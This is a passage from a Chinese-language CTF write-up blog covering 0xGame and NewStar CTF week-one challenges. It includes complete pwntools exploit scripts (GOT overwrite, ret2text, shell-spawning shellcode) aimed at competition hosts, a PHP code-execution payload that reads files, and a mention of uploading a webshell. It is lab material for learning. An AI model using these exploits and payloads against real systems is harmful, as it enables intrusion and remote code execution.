src="/0xGame-week1/p_4_4.png"></p><p>思路：修改got表，将<code>exit</code>的地址改成<code>system</code>的地址，之后让v3&#x3D;&#x3D;8227，即可getshell。</p><p>先泄露出<code>puts</code>的地址。通过ida可以看到，list数组的地址为<code>0x4040A0</code>，<code>exit</code>的地址为<code>0x404048</code>，<code>puts</code>的地址为<code>0x404018</code>。</p><p><img src="/0xGame-week1/p_4_5.png"></p><p>通过计算，<code>(0x4040A0 - 0x404018)/8 = 17</code>，<code>(0x4040A0 - 0x404048)/8 = 11</code> 。根据这些，可以直接读<code>list[-17]</code>把<code>puts</code>的真实地址读出来，然后去算出<code>libc</code>的基地址，再根据基地址算出<code>system</code>的真实地址，之后在<code>list[-11]</code>处将<code>exit</code>的地址改成<code>system</code>的地址。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./got-it&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;8.130.35.16&#x27;</span>, <span class="number">51006</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./got-it&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input student id:&#x27;</span>,<span class="string">&#x27;-17&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">sys_offset = <span class="number">0x052290</span></span><br><span class="line">puts_offset = <span class="number">0x084420</span></span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">system = libc_base + sys_offset</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input student id:&#x27;</span>,<span class="string">&#x27;-11&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Input student name:&#x27;</span>,p64(system))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;8227&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/0xGame-week1/p_4_6.png"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>先base64解码再base32解码，得到flag。</p><h2 id="shark-shark"><a href="#shark-shark" class="headerlink" title="shark shark"></a>shark shark</h2><p>wireshark打开，发现有一堆TCP的数据。</p><p>用记事本打开，可以看到这里有一串16进制的数据，是一个zip压缩包。</p><p><img src="/0xGame-week1/m_2_1.png"></p><p>提取出来后，发现压缩包是加密的。</p><p>最后追踪rcp流，得到密码。</p><p><img src="/0xGame-week1/m_2_2.png"></p><p>解压文件后即可得到flag。</p><h2 id="least-and-most"><a href="#least-and-most" class="headerlink" title="least and most"></a>least and most</h2><p>用<code>Stegsolve</code>打开文件，查看最低位能看到flag的前半。</p><p><img src="/0xGame-week1/m_3_1.png"></p><p>查看最高位能看到flag的后半。</p><p><img src="/0xGame-week1/m_3_2.png"></p><h2 id="重生之我在教学楼打cs"><a href="#重生之我在教学楼打cs" class="headerlink" title="重生之我在教学楼打cs"></a>重生之我在教学楼打cs</h2><p>hint:</p><p><img src="/0xGame-week1/m_4_1.png"></p><p>下载一个<code>BSPViewer</code>，下载地址：<a href="https://www.jb51.net/softs/644965.html">https://www.jb51.net/softs/644965.html</a></p><p>用<code>BSPViewer</code>打开文件，找到那个鼎，在鼎的最下角找到flag。</p><p><img src="/0xGame-week1/m_4_2.png"></p><h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><p>由题目描述和提示可以知道这个jpg文件用了<code>steghide</code>来隐写，但不知道密钥。使用<code>stegseek</code>搭配上kali的<code>rockyou</code>字典来爆破密钥。</p><p><img src="/0xGame-week1/m_6_1.png"></p><p>爆破出密钥后即可得到flag。</p><p><img src="/0xGame-week1/m_6_2.png"></p><h2 id="another-signin"><a href="#another-signin" class="headerlink" title="another signin"></a>another signin</h2><p>区块链签到题。</p><p>参考视频：<a href="https://www.bilibili.com/video/BV1Xe4y1e7sQ/">【CTF】区块链–合约题入门操作 区块链题型简介 水龙头的对比 remixIDE的基本使用 1——NewStarCTF</a></p><p>基本跟着视频做就行了。</p><p>先安装好小狐狸<code>metamask</code>。</p><p>在小狐狸中添加<code>rpc</code>，也就是合约网络，网络内容如下。</p><p><img src="/0xGame-week1/m_5_1.png"></p><p>nc 连接，先 1 创建一个账户，然后用小狐狸转账<code>0.001</code>，接着 2 查看创建是否成功，成功后会返回类似下面的信息。</p><p><img src="/0xGame-week1/m_5_2.png"></p><p>查看 4 ，获取源码。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: UNLICENSED</span></span><br><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.9</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Greeter</span> &#123;</span><br><span class="line">    string greeting;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">string memory _greeting</span>) &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">greet</span>(<span class="params"></span>) public view returns (string memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setGreeting</span>(<span class="params">string memory _greeting</span>) public &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isSolved</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        string memory expected = <span class="string">&quot;Love0xGame&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(expected)) == <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(greeting));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <a href="https://remix.ethereum.org/">在线网站</a> 编写合约。</p><p>exp:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract exp&#123;</span><br><span class="line">    address transcation= <span class="number">0x4Bc4FC689aEA6D588B2cad1F4213430bf3Cea410</span>;</span><br><span class="line">    <span class="title class_">Greeter</span> target=<span class="title class_">Greeter</span>(transcation);</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>)payable&#123;&#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">hack</span>(<span class="params"></span>) public <span class="title function_">returns</span>(<span class="params">bool</span>)&#123;</span><br><span class="line">        bool ans=<span class="literal">false</span>;</span><br><span class="line">        string memory greeting=<span class="string">&quot;Love0xGame&quot;</span>;</span><br><span class="line">        target.<span class="title function_">setGreeting</span>(greeting);</span><br><span class="line">        ans=target.<span class="title function_">isSolved</span>();</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击后即可得到flag。</p><p><img src="/0xGame-week1/m_5_3.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
          <category> 新生赛 </category>
          
          <category> ak </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> web </tag>
            
            <tag> re </tag>
            
            <tag> pwn </tag>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStar-CTF-Week1</title>
      <link href="/NewStar-CTF-Week1/"/>
      <url>/NewStar-CTF-Week1/</url>
      
        <content type="html"><![CDATA[<h1 id="NewStar-CTF-week1"><a href="#NewStar-CTF-week1" class="headerlink" title="NewStar CTF week1"></a>NewStar CTF week1</h1><p>全部ak了，排名第九。</p><p><img src="/NewStar-CTF-Week1/1111.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h2><ol><li><p>直接访问<code>www.zip</code>，发现下载了源码。</p></li><li><p>压缩包内有两个文件。</p><p><img src="/NewStar-CTF-Week1/w_1_1.png"></p></li><li><p>查看这两个文件即可得到flag。</p></li></ol><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p>只有前端过滤，bp抓包直接上传一句话木马就行了。</p><p><img src="/NewStar-CTF-Week1/w_2_1.png"></p><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><ol><li><p>按照题目要求，get传入<code>number1</code>和<code>number2</code>，能够计算结果。</p><p><img src="/NewStar-CTF-Week1/w_3_1.png"></p></li><li><p>传入一个非数字，进入<code>debug</code>，在<code>debug</code>页面找到了flag。</p><p><img src="/NewStar-CTF-Week1/w_3_2.png"></p></li></ol><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><ol><li><p>根据要求，get传入<code>ctf=x</code>。</p></li><li><p>查看源码发现了提示，将 字符串base64解码，post传入<code>secret=n3wst4rCTF2023g00000d</code>。</p><p><img src="/NewStar-CTF-Week1/w_4_1.png"></p></li><li><p><code>Cookie</code>传入<code>power=ctfer</code>。</p></li><li><p><code>User-Agent</code>改为<code> NewStarCTF2023</code>。</p></li><li><p>添加<code>referer</code>为<code>newstarctf.com</code>。</p></li><li><p>参考 <a href="http://t.csdn.cn/7Y4Cc">这个博客</a> ，添加<code>X-Real-IP</code>为<code>127.0.0.1</code>。</p><p><img src="/NewStar-CTF-Week1/w_4_2.png"></p></li></ol><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><ol><li><p><code>Level 1</code>、<code>Level 2</code>、<code>Level 3</code>都拿数组绕。</p></li><li><p><code>Level 4</code>，get传入<code>&#39;key5=2024a</code>，绕过<code>is_numeric</code>。</p></li><li><p><code>Level 5</code>，post传入<code>flag=%00</code>，即可得到flag。</p><p><img src="/NewStar-CTF-Week1/w_5_1.png"></p></li></ol><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><ol><li><p>通过百度搜或者爆破，可以知道<code>password=114514</code>。</p><p><img src="/NewStar-CTF-Week1/w_6_1.png"></p></li><li><p>php变量的特性，传入<code>e[v.a.l=phpinfo();</code>，成功执行代码。</p><p><img src="/NewStar-CTF-Week1/w_6_2.png"></p></li><li><p>利用反引号，成功读出flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=114514&amp;e[v.a.l=echo `tac /f*`;</span><br></pre></td></tr></table></figure><p><img src="/NewStar-CTF-Week1/w_6_3.png"></p></li></ol><h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><ol><li><p>爆破出<code>admin</code>的密码。</p><p><img src="/NewStar-CTF-Week1/w_7_1.png"></p></li><li><p>登录成功后，发现会跳转到另一个页面。</p><p><img src="/NewStar-CTF-Week1/w_7_2.png"></p></li><li><p>手动跟过去，即可得到flag。</p><p><img src="/NewStar-CTF-Week1/w_7_3.png"></p></li></ol><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="p1eee"><a href="#p1eee" class="headerlink" title="p1eee"></a>p1eee</h2><ol><li><p>开启了pie保护。</p></li><li><p>ida查看，能看到有后门函数。</p><p><img src="/NewStar-CTF-Week1/p_1_1.png"></p></li><li><p>查看变量<code>buf</code>，可以知道<code>buf</code>的长度为<code>0x20</code>。</p><p><img src="/NewStar-CTF-Week1/p_1_2.png"></p></li><li><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./p1eee&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27761</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + <span class="string">&#x27;\x7b&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;A nice try to break pie!!!\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;A nice try to break pie!!!\n&#x27;</span>)</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + <span class="string">&#x27;\x64&#x27;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>疑惑：为啥直接跳到后门不行，要先跳到<code>main</code>再跳到后门。</p></li></ol><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>ida打开，能直接看到后门的地址和字符长度。</p><p><img src="/NewStar-CTF-Week1/p_2_1.png"></p><p><img src="/NewStar-CTF-Week1/p_2_2.png"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;node4.buuoj.cn&#x27;, 26560)</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span> * <span class="number">32</span> + <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x04011FB</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>学习链接：<a href="https://www.bilibili.com/read/cv11147377/?from=search&spm_id_from=333.337.0.0">https://www.bilibili.com/read/cv11147377/?from=search&amp;spm_id_from=333.337.0.0</a></p><p>基本和上面哪个一样。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#cal =  process(&#x27;./ezshellcode&#x27;)</span></span><br><span class="line">cal = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29446</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">cal.send(payload)</span><br><span class="line">cal.interactive()</span><br></pre></td></tr></table></figure><h2 id="newstar-shop"><a href="#newstar-shop" class="headerlink" title="newstar shop"></a>newstar shop</h2><p>整形溢出。</p><p>分析发现，<code>money</code>是一个无符号型整数，我们只要在商店花完钱，之后选3扣个50块，我们就能让<code>money</code>变成一个超大数，之后就能买<code>shell</code>了。</p><p><img src="/NewStar-CTF-Week1/p_4_1.png"></p><p><img src="/NewStar-CTF-Week1/p_4_2.png"></p><p><img src="/NewStar-CTF-Week1/p_4_3.png"></p><h2 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h2><p>伪随机数，只要种子确定好，就能<code>getshell</code>。</p><p>利用<code>$0</code>来获取shell，参考链接：<a href="http://lihuaxi.xjx100.cn/news/1189683.html?action=onClick">http://lihuaxi.xjx100.cn/news/1189683.html?action=onClick</a></p><p>因此我们获取的种子需要满足能返回<code>$0</code>，因此写了个判断，判断对了才进远端。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf=cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">aa=<span class="string">&quot;2$031&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    elf.srand(<span class="built_in">int</span>(time.time()))</span><br><span class="line">    payload = <span class="built_in">str</span>(elf.rand()).encode()</span><br><span class="line">    a=elf.rand()%<span class="number">5</span></span><br><span class="line">    b=elf.rand()%<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">2</span> <span class="keyword">and</span> b==<span class="number">1</span>:</span><br><span class="line">        <span class="comment">#cal = process(&#x27;./random&#x27;)</span></span><br><span class="line">        cal = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25768</span>)</span><br><span class="line">        cal.recvuntil(<span class="string">b&#x27;can you guess the number?&#x27;</span>)</span><br><span class="line">        cal.sendline(payload)</span><br><span class="line">        <span class="built_in">print</span>(aa[b]+aa[a])</span><br><span class="line">        cal.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="easy-RE"><a href="#easy-RE" class="headerlink" title="easy_RE"></a>easy_RE</h2><p>ida打开，就能在main函数找到两段flag。</p><p><img src="/NewStar-CTF-Week1/r_1_1.png"></p><p><img src="/NewStar-CTF-Week1/r_1_2.png"></p><h2 id="咳"><a href="#咳" class="headerlink" title="咳"></a>咳</h2><p>upx的壳。</p><ol><li><p>先用<code>exeinfope</code>查壳，可以知道是<code>upx</code>的壳。</p><p><img src="/NewStar-CTF-Week1/r_2_1.png"></p></li><li><p>脱壳后用ida打开，可以知道<code>flag</code>的每一个字符的<code>ascll</code>码都+1了之后再和<code>enc</code>做比较，还得知了<code>enc</code>的值。</p><p><img src="/NewStar-CTF-Week1/r_2_2.png"></p><p><img src="/NewStar-CTF-Week1/r_2_3.png"></p></li><li><p>最后的脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2><ol><li><p>ida打开，可以看到有一个<code>encode</code>函数，跟进查看，可以看到这个函数的逻辑。</p><p><img src="/NewStar-CTF-Week1/r_3_1.png"></p></li><li><p>后边把加密的字符先base64编码后，再和<code>VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t</code>做比较。</p></li><li><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a=<span class="string">b&#x27;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&#x27;</span></span><br><span class="line">b=base64.b64decode(a)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    flag+=<span class="built_in">chr</span>((i-<span class="number">16</span>)^<span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;D0_4ou_7now_wha7_ELF_1s?&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="Segments"><a href="#Segments" class="headerlink" title="Segments"></a>Segments</h2><p>shift_f7，即可看到flag。</p><p><img src="/NewStar-CTF-Week1/r_4_1.png"></p><h2 id="Endian"><a href="#Endian" class="headerlink" title="Endian"></a>Endian</h2><p>ida打开，发现<code>array</code>数组的值和<code>0x12345678</code>做异或。</p><p><img src="/NewStar-CTF-Week1/r_5_1.png"></p><p><img src="/NewStar-CTF-Week1/r_5_2.png"></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">a=[<span class="number">0x75553A1E</span>, <span class="number">0x7B583A03</span>, <span class="number">0x4D58220C</span>, <span class="number">0x7B50383D</span>, <span class="number">0x736B3819</span>]</span><br><span class="line">flag=<span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    hex_string=<span class="built_in">str</span>(<span class="built_in">hex</span>(i^<span class="number">0x12345678</span>))[<span class="number">2</span>:].encode()</span><br><span class="line">    <span class="comment">#print(hex_string)</span></span><br><span class="line">    flag+=binascii.unhexlify(hex_string)[::-<span class="number">1</span>] </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;llittl_Endian_a&#x27;</span></span><br></pre></td></tr></table></figure><p>最后加上一个大括号就行了。</p><h2 id="AndroXor"><a href="#AndroXor" class="headerlink" title="AndroXor"></a>AndroXor</h2><ol><li><p>用<code>jadx</code>逆向<code>apk</code>，之后在<code>MainActivity</code>找到了这个。</p><p><img src="/NewStar-CTF-Week1/r_6_1.png"></p></li><li><p>接着在下边找到了一个异或的密钥。</p></li><li><p>脚本（C++）：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> a[]=&#123;<span class="number">14</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">2</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="number">11</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>&#125;;</span><br><span class="line">string key=<span class="string">&quot;happyx3&quot;</span>;</span><br><span class="line">string flag=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag+=(<span class="type">char</span>)(a[i]^key[i%key.<span class="built_in">length</span>()]);</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;3z_And0r1d_X0r_x1x1&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="lazy-activtiy"><a href="#lazy-activtiy" class="headerlink" title="lazy_activtiy"></a>lazy_activtiy</h2><p>同样用<code>jadx</code>逆向，全局搜<code>flag&#123;</code>即可看到flag。</p><p><img src="/NewStar-CTF-Week1/r_7_1.png"></p><h2 id="EzPE"><a href="#EzPE" class="headerlink" title="EzPE"></a>EzPE</h2><p>参考：<a href="https://www.cnblogs.com/cyx-b/p/13485664.html">https://www.cnblogs.com/cyx-b/p/13485664.html</a></p><p>先学习PE程序的结构，然后修复PE头。</p><p><img src="/NewStar-CTF-Week1/r_8_1.png"></p><p>之后用ida打开，可以发现输入出了最后一位，每一位都和后一位进行异或。</p><p><img src="/NewStar-CTF-Week1/r_8_2.png"></p><p><img src="/NewStar-CTF-Week1/r_8_3.png"></p><p>脚本（c++）：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="type">int</span> a[]=&#123;<span class="number">0x0A</span>,<span class="number">0x0C</span>,<span class="number">4</span>,<span class="number">0x1F</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="number">0xC</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="number">0x11</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="number">0x1A</span>,<span class="number">3</span>,<span class="number">0xD</span>,<span class="number">1</span>,<span class="string">&#x27;6&#x27;</span>,<span class="number">0x1F</span>,<span class="number">0x12</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="number">4</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">35</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">a[i]^=a[i+<span class="number">1</span>]^i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">36</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; (<span class="type">char</span>)a[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;Y0u_kn0w_what_1s_PE_File_F0rmat&#125;</span></span><br></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h2><p>根据题目可以知道是brainfuck编码，随便找个在线网站解码就行了。</p><p><img src="/NewStar-CTF-Week1/c_1_1.png"></p><h2 id="Caesar’s-Secert"><a href="#Caesar’s-Secert" class="headerlink" title="Caesar’s Secert"></a>Caesar’s Secert</h2><p>凯撒加密，根据flag头推断出key为5。</p><p><img src="/NewStar-CTF-Week1/c_2_1.png"></p><h2 id="Fence"><a href="#Fence" class="headerlink" title="Fence"></a>Fence</h2><p>栅栏密码，根据 { 的位置推断出key为2 。</p><p><img src="/NewStar-CTF-Week1/c_3_1.png"></p><h2 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenère"></a>Vigenère</h2><p>维吉尼亚加密，根据flag头推算出<code>kfck</code>，尝试<code>kfc</code>后发现正确。</p><p><img src="/NewStar-CTF-Week1/c_4_1.png"></p><h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><p>用yafu分解n，之后直接套脚本。</p><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime</span>(<span class="params">n</span>):</span><br><span class="line">    res = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        res *= getPrime(n)</span><br><span 